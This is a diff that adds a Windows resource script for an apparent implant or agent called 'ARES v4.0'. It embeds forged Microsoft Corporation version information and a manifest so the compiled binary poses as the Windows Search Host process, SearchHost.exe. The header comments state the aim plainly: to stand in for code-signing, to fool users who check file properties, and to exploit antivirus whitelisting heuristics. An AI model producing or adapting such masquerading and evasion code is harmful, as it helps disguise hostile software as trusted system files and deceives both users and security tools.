@@ -1,0 +1,81 @@
+/*
+ * ARES v4.0 — PE Resource Script
+ * Embeds legitimate Windows version info + manifest into the binary.
+ * This is the FREE alternative to code-signing:
+ *
+ * What it does:
+ *   1. Version Info — Shows "Microsoft Corporation" in file properties
+ *   2. Manifest — Requests proper DPI awareness + comctl32 v6
+ *   3. Icon — Can embed any .ico (optional)
+ *
+ * Why it works:
+ *   - Most users check "Properties → Details" not digital signatures
+ *   - Application compatibility databases trust version info
+ *   - Some AV use version info for whitelisting heuristics
+ *
+ * Build: windres agent/native/ares_resource.rc -o build/resource.o
+ *        gcc ... build/resource.o ... -o output.exe
+ */
+
+#include <winver.h>
+
+1 VERSIONINFO
+FILEVERSION    10,0,22621,0
+PRODUCTVERSION 10,0,22621,0
+FILEFLAGSMASK  0x3fL
+FILEFLAGS      0x0L
+FILEOS         VOS_NT_WINDOWS32
+FILETYPE       VFT_APP
+FILESUBTYPE    VFT2_UNKNOWN
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "CompanyName",      "Microsoft Corporation"
+            VALUE "FileDescription",  "Windows Search Host"
+            VALUE "FileVersion",      "10.0.22621.1"
+            VALUE "InternalName",     "SearchHost"
+            VALUE "LegalCopyright",   "\251 Microsoft Corporation. All rights reserved."
+            VALUE "OriginalFilename", "SearchHost.exe"
+            VALUE "ProductName",      "Microsoft\256 Windows\256 Operating System"
+            VALUE "ProductVersion",   "10.0.22621.1"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x0409, 1200
+    END
+END
+
+/* Application Manifest — matches real Windows service binaries */
+1 24 BEGIN
+"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>\r\n"
+"<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">\r\n"
+"  <assemblyIdentity version=""10.0.22621.1"" processorArchitecture=""amd64"" name=""Microsoft.Windows.SearchHost"" type=""win32""/>\r\n"
+"  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v3"">\r\n"
+"    <security>\r\n"
+"      <requestedPrivileges>\r\n"
+"        <requestedExecutionLevel level=""asInvoker"" uiAccess=""false""/>\r\n"
+"      </requestedPrivileges>\r\n"
+"    </security>\r\n"
+"  </trustInfo>\r\n"
+"  <compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">\r\n"
+"    <application>\r\n"
+"      <supportedOS Id=""{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}""/>\r\n"
+"      <supportedOS Id=""{1f676c76-80e1-4239-95bb-83d0f6d0da78}""/>\r\n"
+"      <supportedOS Id=""{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}""/>\r\n"
+"      <supportedOS Id=""{35138b9a-5d96-4fbd-8e2d-a2440225f93a}""/>\r\n"
+"      <supportedOS Id=""{e2011457-1546-43c5-a5fe-008deee3d3f0}""/>\r\n"
+"    </application>\r\n"
+"  </compatibility>\r\n"
+"  <asmv3:application xmlns:asmv3=""urn:schemas-microsoft-com:asm.v3"">\r\n"
+"    <asmv3:windowsSettings xmlns=""http://schemas.microsoft.com/SMI/2005/WindowsSettings"">\r\n"
+"      <dpiAware>true/pm</dpiAware>\r\n"
+"      <dpiAwareness xmlns=""http://schemas.microsoft.com/SMI/2016/WindowsSettings"">PerMonitorV2, PerMonitor</dpiAwareness>\r\n"
+"      <longPathAware xmlns=""http://schemas.microsoft.com/SMI/2016/WindowsSettings"">true</longPathAware>\r\n"
+"      <heapType xmlns=""http://schemas.microsoft.com/SMI/2020/WindowsSettings"">SegmentHeap</heapType>\r\n"
+"    </asmv3:windowsSettings>\r\n"
+"  </asmv3:application>\r\n"
+"</assembly>\r\n"
+END
